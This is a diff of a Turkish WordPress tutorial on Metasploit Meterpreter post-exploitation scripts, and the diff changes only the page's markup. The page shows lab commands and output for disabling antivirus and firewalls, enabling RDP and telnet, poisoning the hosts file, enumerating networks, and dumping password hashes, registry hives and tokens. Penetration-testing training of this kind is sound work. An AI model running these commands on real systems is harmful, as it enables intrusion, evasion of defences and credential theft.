@@ -34,15 +34,15 @@ url: /tr/msf-meterpreter-scripting/
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p>Meterpreter komut satırının güçlü yönlerinden bir tanesi de çok yönlülük ve dışarıdan başka script kodlarının kolayca adapte edilebilmesidir. Bu yazıda, Meterpreter içinde öncelikle mevcut kodların neler olduğunu göreceğiz. Ardından ilerleyen yazılarda, ihtiyaca göre kendi script kodlarımızı oluşturmayı göreceğiz.</p>
+<p>Meterpreter komut satırının güçlü yönlerinden bir tanesi de çok yönlülük ve dışarıdan başka script kodlarının kolayca adapte edilebilmesidir. Bu yazıda, Meterpreter içinde öncelikle mevcut kodların neler olduğunu göreceğiz. Ardından ilerleyen yazılarda, ihtiyaca göre kendi script kodlarımızı oluşturmayı göreceğiz.
   
 
 <!-- wp:paragraph -->
-<p>Metasploit Framework sisteminin tamamında olduğu gibi Meterpreter script kodları da Ruby programlama diliyle yazılmaktadır. Ruby hakkında yeterli bilgi sahibi değilseniz,&nbsp;<a href="http://ruby-doc.org/docs/ProgrammingRuby/">Ruby Programlama</a>&nbsp;web sitesini bir miktar incelemenizi tavsiye ediyorum.</p>
+<p>Metasploit Framework sisteminin tamamında olduğu gibi Meterpreter script kodları da Ruby programlama diliyle yazılmaktadır. Ruby hakkında yeterli bilgi sahibi değilseniz,&nbsp;<a href="http://ruby-doc.org/docs/ProgrammingRuby/">Ruby Programlama</a>&nbsp;web sitesini bir miktar incelemenizi tavsiye ediyorum.
   
 
 <!-- wp:paragraph -->
-<p>Metasploit Framework içerisinde mevcut bulunan scriptleri incelemek isterseniz,&nbsp;<a href="https://www.offensive-security.com/metasploit-unleashed/existing-scripts/">Github</a>&nbsp;adresini inceleyebilirsiniz. Mevcut scriptlerin incelenmesi bizim çok işimize yarayacaktır. Muhtemelen, sizin yapmak istediğiniz işleme ait bir örnek kod parçası mevcut scriptlerin içinde bulunmaktadır. Buradan istediğiniz kod bölümünü alarak kullanmak en mantıklı yaklaşım olacaktır.</p>
+<p>Metasploit Framework içerisinde mevcut bulunan scriptleri incelemek isterseniz,&nbsp;<a href="https://www.offensive-security.com/metasploit-unleashed/existing-scripts/">Github</a>&nbsp;adresini inceleyebilirsiniz. Mevcut scriptlerin incelenmesi bizim çok işimize yarayacaktır. Muhtemelen, sizin yapmak istediğiniz işleme ait bir örnek kod parçası mevcut scriptlerin içinde bulunmaktadır. Buradan istediğiniz kod bölümünü alarak kullanmak en mantıklı yaklaşım olacaktır.
   
 
 <!-- wp:heading {"level":1} -->
@@ -50,77 +50,77 @@ url: /tr/msf-meterpreter-scripting/
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p>Aşağıda, bir kaç script örneği ve ne gibi işlemler yaptığı açıklanmıştır. Bu doğrultuda Ruby kodlarını inceleyebilirsiniz.</p>
+<p>Aşağıda, bir kaç script örneği ve ne gibi işlemler yaptığı açıklanmıştır. Bu doğrultuda Ruby kodlarını inceleyebilirsiniz.
   
 
 <!-- wp:quote -->
 <blockquote class="wp-block-quote"><!-- wp:paragraph -->
-<p>Meterpreter scriptlerinin kullanımı için, hedef sistemde bir şekilde Meterpreter oturumu açmış olmanız gerekmektedir. Anlatımlarda, oturum açtığınız kabul edilmiştir.</p>
+<p>Meterpreter scriptlerinin kullanımı için, hedef sistemde bir şekilde Meterpreter oturumu açmış olmanız gerekmektedir. Anlatımlarda, oturum açtığınız kabul edilmiştir.
   </blockquote>
 <!-- /wp:quote -->
 
  
-<h2 class="wp-block-heading" id="checkvm">checkvm</h2>
+<h2 class="wp-block-heading" id="checkvm">checkvm
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p><code>checkvm</code>&nbsp;scripti, adından da anlaşılacağı gibi, oturumu bir sanal makinede açıp açmadığınızı kontrol etmekte kullanılır.</p>
+<p><code>checkvm</code>&nbsp;scripti, adından da anlaşılacağı gibi, oturumu bir sanal makinede açıp açmadığınızı kontrol etmekte kullanılır.
   
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run checkvm  
+<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter ***&gt;***  run checkvm  
  
- <strong>[</strong><strong>*</strong><strong>]</strong> Checking <strong>if </strong>SSHACKTHISBOX-0 is a Virtual Machine ........
- <strong>[</strong><strong>*</strong><strong>]</strong> This is a VMware Workstation/Fusion Virtual Machine
+ ***[*** ******* ***]***  Checking ***if *** SSHACKTHISBOX-0 is a Virtual Machine ........
+ ***[*** ******* ***]***  This is a VMware Workstation/Fusion Virtual Machine
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="getcountermeasure">getcountermeasure</h2>
+<h2 class="wp-block-heading" id="getcountermeasure">getcountermeasure
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p><code>getcountermeasure</code>&nbsp;scripti, hedef sistemin güvenlik bilgisini görmeyi sağlar. Antivirüs veya Firewall u devre dışı bırakmanıza yardım eder.</p>
+<p><code>getcountermeasure</code>&nbsp;scripti, hedef sistemin güvenlik bilgisini görmeyi sağlar. Antivirüs veya Firewall u devre dışı bırakmanıza yardım eder.
   
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run getcountermeasure 
+<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter ***&gt;***  run getcountermeasure 
  
- <strong>[</strong><strong>*</strong><strong>]</strong> Running Getcountermeasure on the target... 
- <strong>[</strong><strong>*</strong><strong>]</strong> Checking <strong>for </strong>contermeasures...
- <strong>[</strong><strong>*</strong><strong>]</strong> Getting Windows Built <strong>in </strong>Firewall configuration...
- <strong>[</strong><strong>*</strong><strong>]</strong>    
- <strong>[</strong><strong>*</strong><strong>]</strong>     Domain profile configuration:
- <strong>[</strong><strong>*</strong><strong>]</strong>     -------------------------------------------------------------------
- <strong>[</strong><strong>*</strong><strong>]</strong>     Operational mode                  <strong>=</strong> Disable
- <strong>[</strong><strong>*</strong><strong>]</strong>     Exception mode                    <strong>=</strong> Enable
- <strong>[</strong><strong>*</strong><strong>]</strong>    
- <strong>[</strong><strong>*</strong><strong>]</strong>     Standard profile configuration:
- <strong>[</strong><strong>*</strong><strong>]</strong>     -------------------------------------------------------------------
- <strong>[</strong><strong>*</strong><strong>]</strong>     Operational mode                  <strong>=</strong> Disable
- <strong>[</strong><strong>*</strong><strong>]</strong>     Exception mode                    <strong>=</strong> Enable
- <strong>[</strong><strong>*</strong><strong>]</strong>    
- <strong>[</strong><strong>*</strong><strong>]</strong>     Local Area Connection 6 firewall configuration:
- <strong>[</strong><strong>*</strong><strong>]</strong>     -------------------------------------------------------------------
- <strong>[</strong><strong>*</strong><strong>]</strong>     Operational mode                  <strong>=</strong> Disable
- <strong>[</strong><strong>*</strong><strong>]</strong>    
- <strong>[</strong><strong>*</strong><strong>]</strong> Checking DEP Support Policy...
+ ***[*** ******* ***]***  Running Getcountermeasure on the target... 
+ ***[*** ******* ***]***  Checking ***for *** contermeasures...
+ ***[*** ******* ***]***  Getting Windows Built ***in *** Firewall configuration...
+ ***[*** ******* ***]***     
+ ***[*** ******* ***]***      Domain profile configuration:
+ ***[*** ******* ***]***      -------------------------------------------------------------------
+ ***[*** ******* ***]***      Operational mode                  ***=***  Disable
+ ***[*** ******* ***]***      Exception mode                    ***=***  Enable
+ ***[*** ******* ***]***     
+ ***[*** ******* ***]***      Standard profile configuration:
+ ***[*** ******* ***]***      -------------------------------------------------------------------
+ ***[*** ******* ***]***      Operational mode                  ***=***  Disable
+ ***[*** ******* ***]***      Exception mode                    ***=***  Enable
+ ***[*** ******* ***]***     
+ ***[*** ******* ***]***      Local Area Connection 6 firewall configuration:
+ ***[*** ******* ***]***      -------------------------------------------------------------------
+ ***[*** ******* ***]***      Operational mode                  ***=***  Disable
+ ***[*** ******* ***]***     
+ ***[*** ******* ***]***  Checking DEP Support Policy...
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="getgui">getgui</h2>
+<h2 class="wp-block-heading" id="getgui">getgui
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p><code>getgui</code>&nbsp;scripti, hedef bilgisayarda RDP özelliği kapalıysa açmayı sağlar.</p>
+<p><code>getgui</code>&nbsp;scripti, hedef bilgisayarda RDP özelliği kapalıysa açmayı sağlar.
   
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run getgui 
+<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter ***&gt;***  run getgui 
 
-<strong>[!]</strong> Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
-<strong>[!]</strong> Example: run post/windows/manage/enable_rdp OPTION<strong>=</strong>value <strong>[</strong>...]
+***[!]***  Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
+***[!]***  Example: run post/windows/manage/enable_rdp OPTION***=*** value ***[*** ...]
 Windows Remote Desktop Enabler Meterpreter Script
 Usage: getgui -u  -p 
 Or:    getgui -e
@@ -133,43 +133,43 @@ OPTIONS:
     -p   The Password of the user to add.
     -u   The Username of the user to add.
  
- meterpreter <strong>&gt;</strong> run getgui -e
+ meterpreter ***&gt;***  run getgui -e
  
- <strong>[</strong><strong>*</strong><strong>]</strong> Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
- <strong>[</strong><strong>*</strong><strong>]</strong> Carlos Perez carlos_perez@darkoperator.com
- <strong>[</strong><strong>*</strong><strong>]</strong> Enabling Remote Desktop
- <strong>[</strong><strong>*</strong><strong>]</strong> RDP is already enabled
- <strong>[</strong><strong>*</strong><strong>]</strong> Setting Terminal Services service startup mode
- <strong>[</strong><strong>*</strong><strong>]</strong> Terminal Services service is already set to auto
- <strong>[</strong><strong>*</strong><strong>]</strong> Opening port <strong>in </strong>local firewall <strong>if </strong>necessary
+ ***[*** ******* ***]***  Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+ ***[*** ******* ***]***  Carlos Perez carlos_perez@darkoperator.com
+ ***[*** ******* ***]***  Enabling Remote Desktop
+ ***[*** ******* ***]***  RDP is already enabled
+ ***[*** ******* ***]***  Setting Terminal Services service startup mode
+ ***[*** ******* ***]***  Terminal Services service is already set to auto
+ ***[*** ******* ***]***  Opening port ***in *** local firewall ***if *** necessary
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="get_local_subnets">get_local_subnets</h2>
+<h2 class="wp-block-heading" id="get_local_subnets">get_local_subnets
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p><code>get_local_subnets</code>&nbsp;scripti, hedef bilgisayarın yerel subnet bilgilerini elde etmeyi sağlar. Bu bilgiler pivoting işlemlerinde kullanılabilir.</p>
+<p><code>get_local_subnets</code>&nbsp;scripti, hedef bilgisayarın yerel subnet bilgilerini elde etmeyi sağlar. Bu bilgiler pivoting işlemlerinde kullanılabilir.
   
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run get_local_subnets 
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run get_local_subnets 
 
 Local subnet: 10.211.55.0/255.255.255.0
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="gettelnet">gettelnet</h2>
+<h2 class="wp-block-heading" id="gettelnet">gettelnet
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p><code>gettelnet</code>&nbsp;scripti, hedef bilgisayarda telnet özeliği kapalıysa, açmaya yarar.</p>
+<p><code>gettelnet</code>&nbsp;scripti, hedef bilgisayarda telnet özeliği kapalıysa, açmaya yarar.
   
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run gettelnet 
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run gettelnet 
 Windows Telnet Server Enabler Meterpreter Script
 Usage: gettelnet -u  -p 
 
@@ -181,38 +181,38 @@ OPTIONS:
     -p   The Password of the user to add.
     -u   The Username of the user to add.
  
-meterpreter <strong>&gt;</strong> run gettelnet -e
+meterpreter ***&gt;***  run gettelnet -e
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Windows Telnet Server Enabler Meterpreter Script
-<strong>[</strong><strong>*</strong><strong>]</strong> Setting Telnet Server Services service startup mode
-<strong>[</strong><strong>*</strong><strong>]</strong> The Telnet Server Services service is not set to auto, changing it to auto ...
-<strong>[</strong><strong>*</strong><strong>]</strong> Opening port <strong>in </strong>local firewall <strong>if </strong>necessary
+***[*** ******* ***]***  Windows Telnet Server Enabler Meterpreter Script
+***[*** ******* ***]***  Setting Telnet Server Services service startup mode
+***[*** ******* ***]***  The Telnet Server Services service is not set to auto, changing it to auto ...
+***[*** ******* ***]***  Opening port ***in *** local firewall ***if *** necessary
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="hostsedit">hostsedit</h2>
+<h2 class="wp-block-heading" id="hostsedit">hostsedit
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p><code>hostsedit</code>&nbsp;scripti, Windows hosts dosyasına bilgi girmeye yarar. Bağlanılmak istenen web adreslerinin DNS adresleri için önce bu hosts dosyasına bakılır. Hedef bilgisayarı istenen adrese yönlendirmek için kullanılır. Her satıra bir adres girilmelidir.</p>
+<p><code>hostsedit</code>&nbsp;scripti, Windows hosts dosyasına bilgi girmeye yarar. Bağlanılmak istenen web adreslerinin DNS adresleri için önce bu hosts dosyasına bakılır. Hedef bilgisayarı istenen adrese yönlendirmek için kullanılır. Her satıra bir adres girilmelidir.
   
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run hostsedit 
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run hostsedit 
 
-<strong>[!]</strong> Meterpreter scripts are deprecated. Try post/windows/manage/inject_host.
-<strong>[!]</strong> Example: run post/windows/manage/inject_host OPTION<strong>=</strong>value <strong>[</strong>...]
-This Meterpreter script is <strong>for </strong>adding entries <strong>in </strong>to the Windows Hosts file.
+***[!]***  Meterpreter scripts are deprecated. Try post/windows/manage/inject_host.
+***[!]***  Example: run post/windows/manage/inject_host OPTION***=*** value ***[*** ...]
+This Meterpreter script is ***for *** adding entries ***in *** to the Windows Hosts file.
 Since Windows will check first the Hosts file instead of the configured DNS Server
-it will assist <strong>in </strong>diverting traffic to the fake entry or entries. Either a single
+it will assist ***in *** diverting traffic to the fake entry or entries. Either a single
 entry can be provided or a series of entries provided a file with one per line.
 
 OPTIONS:
 
-    -e   Host entry <strong>in </strong>the format of IP,Hostname.
+    -e   Host entry ***in *** the format of IP,Hostname.
     -h        Help Options.
-    -l   Text file with list of entries <strong>in </strong>the format of IP,Hostname. One per line.
+    -l   Text file with list of entries ***in *** the format of IP,Hostname. One per line.
 
 Example:
 
@@ -221,45 +221,45 @@ run hostsedit -e 127.0.0.1,google.com
 
 run hostsedit -l /tmp/fakednsentries.txt
  
- meterpreter <strong>&gt;</strong> run hostsedit -e 10.211.55.162,www.microsoft.com
- <strong>[</strong><strong>*</strong><strong>]</strong> Making Backup of the hosts file.
- <strong>[</strong><strong>*</strong><strong>]</strong> Backup loacated <strong>in </strong>C:\WINDOWS\System32\drivers\etc\hosts62497.back
- <strong>[</strong><strong>*</strong><strong>]</strong> Adding Record <strong>for </strong>Host <a href="http://www.microsoft.com/">www.microsoft.com</a> with IP 10.211.55.162
- <strong>[</strong><strong>*</strong><strong>]</strong> Clearing the DNS Cache
+ meterpreter ***&gt;***  run hostsedit -e 10.211.55.162,www.microsoft.com
+ ***[*** ******* ***]***  Making Backup of the hosts file.
+ ***[*** ******* ***]***  Backup loacated ***in *** C:\WINDOWS\System32\drivers\etc\hosts62497.back
+ ***[*** ******* ***]***  Adding Record ***for *** Host <a href="http://www.microsoft.com/">www.microsoft.com</a> with IP 10.211.55.162
+ ***[*** ******* ***]***  Clearing the DNS Cache
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="killav">killav</h2>
+<h2 class="wp-block-heading" id="killav">killav
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p><code>killav</code>&nbsp;scripti, sistemde bir servis olarak çalışan Antivirüs programlarını devre dışı bırakmada kullanılır.</p>
+<p><code>killav</code>&nbsp;scripti, sistemde bir servis olarak çalışan Antivirüs programlarını devre dışı bırakmada kullanılır.
   
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run killav 
+<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter ***&gt;***  run killav 
  
- <strong>[</strong><strong>*</strong><strong>]</strong> Killing Antivirus services on the target...
- <strong>[</strong><strong>*</strong><strong>]</strong> Killing off cmd.exe...
+ ***[*** ******* ***]***  Killing Antivirus services on the target...
+ ***[*** ******* ***]***  Killing off cmd.exe...
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="remotewinenum">remotewinenum</h2>
+<h2 class="wp-block-heading" id="remotewinenum">remotewinenum
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p><code>remotewinenum</code>&nbsp;scripti, hedef sistem hakkında bilgi etmek için kullanılır.</p>
+<p><code>remotewinenum</code>&nbsp;scripti, hedef sistem hakkında bilgi etmek için kullanılır.
   
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run remotewinenum
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run remotewinenum
 
-<strong>[!]</strong> Meterpreter scripts are deprecated. Try post/windows/gather/wmic_command.
-<strong>[!]</strong> Example: run post/windows/gather/wmic_command OPTION<strong>=</strong>value <strong>[</strong>...]
+***[!]***  Meterpreter scripts are deprecated. Try post/windows/gather/wmic_command.
+***[!]***  Example: run post/windows/gather/wmic_command OPTION***=*** value ***[*** ...]
 Remote Windows Enumeration Meterpreter Script
-This script will enumerate windows hosts <strong>in </strong>the target enviroment
+This script will enumerate windows hosts ***in *** the target enviroment
 given a username and password or using the credential under witch
 Meterpeter is running using WMI wmic windows native tool.
 Usage:
@@ -269,125 +269,125 @@ OPTIONS:
     -h        Help menu.
     -p   Password of user on target system
     -t   The target address
-    -u   User on the target system <strong>(</strong>If not provided it will use credential of process<strong>)</strong>
+    -u   User on the target system ***(*** If not provided it will use credential of process***)*** 
  
- meterpreter <strong>&gt;</strong> run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128
+ meterpreter ***&gt;***  run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128
  
- <strong>[</strong><strong>*</strong><strong>]</strong> Saving report to /root/.msf4/logs/remotewinenum/10.211.55.128_20090711.0142 
- <strong>[</strong><strong>*</strong><strong>]</strong> Running WMIC Commands ....
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic environment list
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic share list
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic nicconfig list
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic computersystem list
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic useraccount list
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic group list
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic sysaccount list
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic volume list brief
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic logicaldisk get description,filesystem,name,size
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic netlogin get name,lastlogon,badpasswordcount
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic netclient list brief
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic netuse get name,username,connectiontype,localname
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic share get name,path
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic nteventlog get path,filename,writeable
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic service list brief
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic process list brief
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic startup list full
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic rdtoggle list
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic product get name,version
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic qfe list
+ ***[*** ******* ***]***  Saving report to /root/.msf4/logs/remotewinenum/10.211.55.128_20090711.0142 
+ ***[*** ******* ***]***  Running WMIC Commands ....
+ ***[*** ******* ***]***      running command wimic environment list
+ ***[*** ******* ***]***      running command wimic share list
+ ***[*** ******* ***]***      running command wimic nicconfig list
+ ***[*** ******* ***]***      running command wimic computersystem list
+ ***[*** ******* ***]***      running command wimic useraccount list
+ ***[*** ******* ***]***      running command wimic group list
+ ***[*** ******* ***]***      running command wimic sysaccount list
+ ***[*** ******* ***]***      running command wimic volume list brief
+ ***[*** ******* ***]***      running command wimic logicaldisk get description,filesystem,name,size
+ ***[*** ******* ***]***      running command wimic netlogin get name,lastlogon,badpasswordcount
+ ***[*** ******* ***]***      running command wimic netclient list brief
+ ***[*** ******* ***]***      running command wimic netuse get name,username,connectiontype,localname
+ ***[*** ******* ***]***      running command wimic share get name,path
+ ***[*** ******* ***]***      running command wimic nteventlog get path,filename,writeable
+ ***[*** ******* ***]***      running command wimic service list brief
+ ***[*** ******* ***]***      running command wimic process list brief
+ ***[*** ******* ***]***      running command wimic startup list full
+ ***[*** ******* ***]***      running command wimic rdtoggle list
+ ***[*** ******* ***]***      running command wimic product get name,version
+ ***[*** ******* ***]***      running command wimic qfe list
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="scraper">scraper</h2>
+<h2 class="wp-block-heading" id="scraper">scraper
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p><code>scraper</code>&nbsp;scripti,&nbsp;<code>remotewinenum</code>&nbsp;ile elde edilen bilgiden daha fazlasını elde etmeye yarar. Elde edilen bilgilerin içinde registry kayıtları da bulunur.</p>
+<p><code>scraper</code>&nbsp;scripti,&nbsp;<code>remotewinenum</code>&nbsp;ile elde edilen bilgiden daha fazlasını elde etmeye yarar. Elde edilen bilgilerin içinde registry kayıtları da bulunur.
   
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run scraper
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run scraper
  
- <strong>[</strong><strong>*</strong><strong>]</strong> New session on 10.211.55.128:4444...
- <strong>[</strong><strong>*</strong><strong>]</strong> Gathering basic system information...
- <strong>[</strong><strong>*</strong><strong>]</strong> Dumping password hashes...
- <strong>[</strong><strong>*</strong><strong>]</strong> Obtaining the entire registry...
- <strong>[</strong><strong>*</strong><strong>]</strong> Exporting HKCU
- <strong>[</strong><strong>*</strong><strong>]</strong> Downloading HKCU <strong>(</strong>C:\WINDOWS\TEMP\LQTEhIqo.reg<strong>)</strong>
- <strong>[</strong><strong>*</strong><strong>]</strong> Cleaning HKCU
- <strong>[</strong><strong>*</strong><strong>]</strong> Exporting HKLM
- <strong>[</strong><strong>*</strong><strong>]</strong> Downloading HKLM <strong>(</strong>C:\WINDOWS\TEMP\GHMUdVWt.reg<strong>)</strong>
+ ***[*** ******* ***]***  New session on 10.211.55.128:4444...
+ ***[*** ******* ***]***  Gathering basic system information...
+ ***[*** ******* ***]***  Dumping password hashes...
+ ***[*** ******* ***]***  Obtaining the entire registry...
+ ***[*** ******* ***]***  Exporting HKCU
+ ***[*** ******* ***]***  Downloading HKCU ***(*** C:\WINDOWS\TEMP\LQTEhIqo.reg***)*** 
+ ***[*** ******* ***]***  Cleaning HKCU
+ ***[*** ******* ***]***  Exporting HKLM
+ ***[*** ******* ***]***  Downloading HKLM ***(*** C:\WINDOWS\TEMP\GHMUdVWt.reg***)*** 
 </code></pre>
 <!-- /wp:code -->
 
 <!-- wp:paragraph -->
-<p>Yukarıdaki örneklerde görüldüğü gibi, Meterpreter script kodlarıyla oldukça detaylı bilgi toplanabilmektedir. Bunun yanında Antivirüs veya Firewall iptal etmede de kullanılmaktadır.</p>
+<p>Yukarıdaki örneklerde görüldüğü gibi, Meterpreter script kodlarıyla oldukça detaylı bilgi toplanabilmektedir. Bunun yanında Antivirüs veya Firewall iptal etmede de kullanılmaktadır.
   
 
  
-<h2 class="wp-block-heading" id="winenum">winenum</h2>
+<h2 class="wp-block-heading" id="winenum">winenum
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p><code>winenum</code>&nbsp;scripti, sistem hakkında en detaylı bilgiyi elde etmede kullanılabilir. Token, hash bilgileri ve diğer tüm bilgileri&nbsp;<code>winenum</code>&nbsp;scripti ile görebilirsiniz.</p>
+<p><code>winenum</code>&nbsp;scripti, sistem hakkında en detaylı bilgiyi elde etmede kullanılabilir. Token, hash bilgileri ve diğer tüm bilgileri&nbsp;<code>winenum</code>&nbsp;scripti ile görebilirsiniz.
   
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run winenum 
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run winenum 
  
- <strong>[</strong><strong>*</strong><strong>]</strong> Running Windows Local Enumerion Meterpreter Script
- <strong>[</strong><strong>*</strong><strong>]</strong> New session on 10.211.55.128:4444...
- <strong>[</strong><strong>*</strong><strong>]</strong> Saving report to /root/.msf4/logs/winenum/10.211.55.128_20090711.0514-99271/10.211.55.128_20090711.0514-99271.txt
- <strong>[</strong><strong>*</strong><strong>]</strong> Checking <strong>if </strong>SSHACKTHISBOX-0 is a Virtual Machine ........
- <strong>[</strong><strong>*</strong><strong>]</strong>     This is a VMware Workstation/Fusion Virtual Machine 
- <strong>[</strong><strong>*</strong><strong>]</strong> Running Command List ...
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command cmd.exe /c set
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command arp -a
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command ipconfig /all
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command ipconfig /displaydns
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command route print
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command net view
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command netstat -nao
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command netstat -vb
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command netstat -ns
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command net accounts
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command net accounts /domain
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command net session
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command net share
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command net group
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command net user
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command net localgroup
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command net localgroup administrators
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command net group administrators
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command net view /domain
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command netsh firewall show config
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command tasklist /svc
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command tasklist /m
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command gpresult /SCOPE COMPUTER /Z
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command gpresult /SCOPE USER /Z
- <strong>[</strong><strong>*</strong><strong>]</strong> Running WMIC Commands ....
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic computersystem list brief
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic useraccount list
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic group list
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic service list brief
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic volume list brief
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic logicaldisk get description,filesystem,name,size
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic netlogin get name,lastlogon,badpasswordcount
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic netclient list brief
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic netuse get name,username,connectiontype,localname
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic share get name,path
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic nteventlog get path,filename,writeable
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic process list brief
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic startup list full
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic rdtoggle list
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic product get name,version
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic qfe
- <strong>[</strong><strong>*</strong><strong>]</strong> Extracting software list from registry
- <strong>[</strong><strong>*</strong><strong>]</strong> Finished Extraction of software list from registry
- <strong>[</strong><strong>*</strong><strong>]</strong> Dumping password hashes...
- <strong>[</strong><strong>*</strong><strong>]</strong> Hashes Dumped
- <strong>[</strong><strong>*</strong><strong>]</strong> Getting Tokens...
- <strong>[</strong><strong>*</strong><strong>]</strong> All tokens have been processed
- <strong>[</strong><strong>*</strong><strong>]</strong> Done!</code></pre>
